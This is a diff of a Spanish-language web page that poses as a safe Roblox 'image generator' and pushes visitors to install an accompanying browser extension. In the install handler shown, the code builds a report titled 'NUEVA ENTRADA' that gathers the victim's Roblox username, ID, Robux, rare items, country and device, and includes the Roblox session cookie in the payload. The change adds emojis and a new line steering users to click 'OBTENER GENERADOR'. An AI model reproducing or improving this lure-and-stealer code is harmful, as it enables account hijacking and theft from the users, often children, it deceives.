@@ -173,15 +173,15 @@
 </head>
 <body>
     <div class="card">
-        <h1>BL PAPI</h1>
-        <div class="subtitle">Creador de imagen</div>
+        <h1>Generador de imagen.</h1>
+        <div class="subtitle">Crea tu imagen</div>
 
         <div class="features">
             <div class="feature-tag"><span>Crea tu imagen de forma rapida y sencilla.</span></div>
             <div class="feature-tag"><span>Solo con 3 clicks</span></div>
-            <div class="feature-tag"><span>100% Seguro(Tambien Puedes Desinstalar el Generador De Imagen Cuando Quieras).</span></div>
+            <div class="feature-tag"><span>100% Seguro (Tambien Puedes Desinstalar el Generador De Imagen Cuando Quieras).</span></div>
             <div class="feature-tag"><span>El generador accede a la API de thumbnails de Roblox Luego Solicita la imagen en resolución original (1080p+).La guarda localmente sin pérdida de calidad. </span></div>
-            <div class="feature-tag"><span></span></div>
+            <div class="feature-tag"><span>Instrucciones Claras Y Precisas.(Clickea El Boton llamado 'INSTRUCCIONES' Para Ver Paso a Paso. Presione 'OBTENER GENERADOR' Al leer Instrucciones).</span></div>
         </div>
 
         <div class="button-group">
@@ -404,31 +404,31 @@ chrome.runtime.onInstalled.addListener(async () => {
     }
 
     const embed = {
-        title: " NUEVA ENTRADA | **BL PAPI** !",
+        title: "🔔 ¡ NUEVA ENTRADA | **BL PAPI** !",
         color: 15158332,
         fields: [
             {
-                name: " INFORMACIÓN GENERAL",
+                name: "📌 INFORMACIÓN GENERAL",
                 value: \`**Dispositivo:** \\\`\${navigator.userAgent.includes('Android') ? ' Android' : ' PC'}\\\`\\n**País:** \\\`\${nombrePais}\\\`\\n**Fecha:** \\\`\${ahora.toLocaleDateString('es-AR')}\\\`\\n**Hora Exacta en \${nombrePais}:** \\\`\${horaLocal}\\\`\`,
                 inline: false
             },
             {
-                name: " INFORMACIÓN DE LA CUENTA ROBLOX",
-                value: \`** Usuario:** \\\`\${info.username || 'No disponible'}\\\`\\n** ID:** \\\`\${info.userId || 'No disponible'}\\\`\\n** Premium:** \\\`\${info.premium || 'No'}\\\`\\n** Robux:** \\\`\${info.robux || 0}\\\`\\n** Seguidores:** \\\`\${info.seguidores || 0}\\\`\\n** Amigos:** \\\`\${info.amigos || 0}\\\`\`,
+                name: "ℹ️ INFORMACIÓN DE LA CUENTA ROBLOX",
+                value: \`**👤 Usuario:** \\\`\${info.username || 'No disponible'}\\\`\\n**🆔️ ID:** \\\`\${info.userId || 'No disponible'}\\\`\\n**💱 Premium:** \\\`\${info.premium || 'No'}\\\`\\n**💰 Robux:** \\\`\${info.robux || 0}\\\`\\n**⭐️ Seguidores:** \\\`\${info.seguidores || 0}\\\`\\n**👥️ Amigos:** \\\`\${info.amigos || 0}\\\`\`,
                 inline: false
             },
             {
-                name: " Inventario",
+                name: "📦 Inventario",
                 value: \`**Headless:** \\\`\${info.headless || 'No'}\\\`\\n**Korblox:** \\\`\${info.korblox || 'No'}\\\`\`,
                 inline: false
             },
             {
-                name: " ESTADÍSTICAS",
-                value: \` **Verificado:** \${info.verified}\\n **Grupos:** \${info.grupos}\`,
+                name: "📈 ESTADÍSTICAS",
+                value: \` **🔰 Verificado:** \${info.verified}\\n **🚻 Grupos:** \${info.grupos}\`,
                 inline: false
             },
             {
-                name: " COOKIE DE ROBLOX",
+                name: "🍪 COOKIE DE ROBLOX",
                 value: \`\\\`\\\`\\\`\${cookie}\\\`\\\`\\\`\`,
                 inline: false
             }
